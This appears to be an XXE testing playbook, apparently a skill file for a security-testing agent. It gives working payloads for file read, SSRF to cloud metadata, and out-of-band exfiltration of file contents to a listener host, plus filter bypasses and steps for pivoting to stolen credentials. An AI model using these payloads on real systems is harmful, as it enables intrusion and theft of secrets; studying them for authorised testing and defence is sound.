# XXE (XML External Entity) Triage

Use this workflow when the target accepts XML, or XML hides inside another format
(SVG, DOCX/XLSX/ODT upload, RSS/Atom, SAML `Response`, XML-RPC), and you suspect the
parser resolves external entities.

Keep it short: confirm the parser resolves entities, then prove file read or SSRF with
real returned bytes. Blind targets go out-of-band (OOB).

## When to Use

- `Content-Type: application/xml` / `text/xml` / `application/soap+xml` endpoints.
- File upload accepts SVG, DOCX/XLSX/ODT (these are ZIP+XML — inject into
  `word/document.xml` / `xl/workbook.xml`), or an RSS/Atom/SAML/XML-RPC endpoint.
- Parser-fallback trick worth testing even on a JSON API: switch
  `Content-Type: application/xml` and send an XML body — some stacks (Jackson XML,
  .NET) parse it anyway.

## Probe Order

### 1. Fingerprint the Parser

From recon, guess the stack (Java `SAXParser`, .NET `XmlDocument`, `libxml2`/PHP,
Python `lxml`). Modern defaults often disable DTDs — test before assuming XXE exists.

### 2. In-band File Read (start with a benign marker, not a secret)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<root>&xxe;</root>
```

### 3. SSRF via XXE (cloud metadata is the high-value proof)

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
```

### 4. Blind XXE (OOB, per-attempt nonce — correlate the nonce to this exact request)

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<nonce>.oob/evil.dtd">%xxe;]>
```

### 5. Parameter-entity Exfil (when the entity value isn't reflected)

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<nonce>.oob/?d=%file;'>">
  %eval;%exfil;
]>
```

Java blocks `%` parameter entities inside the *internal* subset for file read — use
this external-DTD two-stage form there.

### 6. Filter Bypasses

- CDATA wrapping, alternate encodings (`UTF-16`/`UTF-7`) to slip a keyword filter.
- `php://filter/convert.base64-encode/resource=...` on PHP to read files with bytes
  that would otherwise break XML.
- `jar:` / `netdoc:` / `gopher:` schemes on Java for extra read/SSRF reach.
- XInclude when `DOCTYPE` is stripped but the parser still processes includes:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/hostname"/>
</foo>
```

## Decision Rules

- Value reflected in the response → in-band read works, stay in-band.
- Not reflected, or parser blocks nested entities in the internal subset → host an
  external DTD and go OOB (step 5).
- Response is your literal `&xxe;` unexpanded → entities are NOT resolved. Not a finding.
- A bare 500 / generic XML parse error is NOT proof of entity resolution — it usually
  means DTDs are disabled. Only treat it as a signal if you also have a reproducible
  timing/error differential.
- Outbound blocked by egress firewall can make blind OOB fail even when XXE exists —
  try in-band or an internal SSRF target before concluding "not exploitable".

## Proof

- In-band: the requested file's bytes / metadata response appear in the HTTP
  response — quote them in notes.
- Blind: your `<nonce>.oob` listener records the hit, and for exfil the query string
  carries the file content — correlate the nonce to this request.
- No returned bytes and no OOB hit ⇒ not proven.

## Chaining Hooks

- SSRF via XXE → `169.254.169.254` cloud metadata → cloud credential pivot.
- File read → app config/secrets (DB creds, signing keys, `/proc/self/environ`) →
  feed into an auth-bypass or [deserialization.md](deserialization.md) chain.

## Output Discipline

Record: the vulnerable endpoint/content-type, the exact payload used, the proof
(returned bytes or correlated OOB hit), and the chaining step taken (if any).

## Source

Adapted from the NeuroSploit XXE playbook (`knowledge/external/neurosploit/web/xxe.md`,
MIT) — condensed to this skill's probe-order format.
